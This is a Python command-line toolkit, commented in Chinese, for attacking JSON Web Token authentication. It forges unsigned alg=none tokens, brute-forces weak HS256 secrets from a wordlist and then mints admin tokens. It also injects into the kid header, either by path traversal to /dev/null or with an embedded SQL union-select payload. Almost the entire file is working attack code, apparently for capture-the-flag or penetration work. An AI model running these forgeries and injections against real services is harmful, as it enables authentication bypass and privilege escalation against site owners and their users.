#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
用途: JWT 三合一工具箱 —— 子命令式:
     none   alg=none 攻击(去签名/大小写变体)
     crack  HS256 弱密钥字典爆破(命中后可顺手伪造 admin)
     kid    kid 路径注入(指向已知文件如 /dev/null)与 SQL 注入(key 回显可控)
适用条件:
    - 目标用 JWT 做鉴权, 能拿到一个有效 token 样本(解到 header/payload)
    - crack 需要一个字典(如 rockyou / ctf 常用弱密钥表)
用法:
    python web_jwt_kit.py none  -t <token> [--role admin]
    python web_jwt_kit.py crack -t <token> -w /usr/share/wordlists/rockyou.txt
    python web_jwt_kit.py kid   -t <token> --mode null | --mode sql --key '<注入串>'
"""
import argparse
import base64
import hashlib
import hmac
import json


def b64url_decode(seg: str) -> bytes:
    return base64.urlsafe_b64decode(seg + "=" * (-len(seg) % 4))


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def sign_hs256(signing_input: bytes, key: bytes) -> str:
    return b64url_encode(hmac.new(key, signing_input, hashlib.sha256).digest())


def split_token(token: str):
    h, p, s = token.split(".")
    return h, p, s


def craft(header: dict, payload: dict, key: bytes) -> str:
    """按指定 header/payload/key 重签一个 JWT"""
    si = (b64url_encode(json.dumps(header, separators=(",", ":")).encode()) + "." +
          b64url_encode(json.dumps(payload, separators=(",", ":")).encode())).encode()
    if header.get("alg", "").lower() == "none":
        return (si + b".").decode()             # none 算法: 签名段留空
    return (si + b"." + sign_hs256(si, key).encode()).decode()


def cmd_none(args):
    """alg=none 攻击: 保留原 payload, 签名去掉; 兼容 None/NONE 等大小写变体"""
    h, p, _ = split_token(args.token)
    header, payload = json.loads(b64url_decode(h)), json.loads(b64url_decode(p))
    if args.role:
        payload[args.claim] = args.role         # 常见: role/username/isAdmin
    for alg in ("none", "None", "NONE", "nOnE"):
        header["alg"] = alg
        tok = craft(header, payload, b"")
        print(f"[{alg}] {tok}")


def cmd_crack(args):
    """HS256 弱密钥爆破: hmac 对比签名, 命中后输出伪造 admin 的成品 token"""
    h, p, s = split_token(args.token)
    header, payload = json.loads(b64url_decode(h)), json.loads(b64url_decode(p))
    si = f"{h}.{p}".encode()
    with open(args.wordlist, "r", errors="ignore") as f:
        for line in f:
            key = line.strip().encode()
            if hmac.compare_digest(sign_hs256(si, key), s):
                print(f"[+] 密钥命中: {key.decode()}")
                payload[args.claim] = args.role
                print(f"[+] 伪造 token: {craft(header, payload, key)}")
                return
    print("[-] 字典跑完未命中, 换大字典/检查是否 RS256")


def cmd_kid(args):
    """kid 注入: 目录穿越(用内容已知文件当密钥) / SQL 注入(union 控制返回 key)"""
    h, p, _ = split_token(args.token)
    header, payload = json.loads(b64url_decode(h)), json.loads(b64url_decode(p))
    if args.role:
        payload[args.claim] = args.role

    if args.mode == "null":
        # /dev/null 内容为空 -> 空密钥 HS256; 其他可用: /proc/sys/kernel/random/boot_id 等
        header["kid"] = "/dev/null"
        tok = craft(header, payload, b"")
    else:
        # kid 进 SQL: UNION SELECT 让后端把 'secret' 当密钥取出, 我们用同一密钥重签
        header["kid"] = args.key_sql
        tok = craft(header, payload, args.key.encode())
    print(tok)


if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="JWT 攻击三合一")
    ap.add_argument("cmd", choices=["none", "crack", "kid"])
    ap.add_argument("-t", "--token", required=True, help="原站 JWT 样本")
    ap.add_argument("-w", "--wordlist", help="crack 用字典")
    ap.add_argument("--claim", default="username", help="要改的载荷字段")
    ap.add_argument("--role", default="admin", help="字段目标值")
    ap.add_argument("--mode", choices=["null", "sql"], default="null", help="kid 模式")
    ap.add_argument("--key", default="secret", help="sql 模式 union 出的密钥")
    ap.add_argument("--key-sql", default="x' union select 'secret' -- ",
                    help="kid SQL 注入语句")
    args = ap.parse_args()
    {"none": cmd_none, "crack": cmd_crack, "kid": cmd_kid}[args.cmd](args)
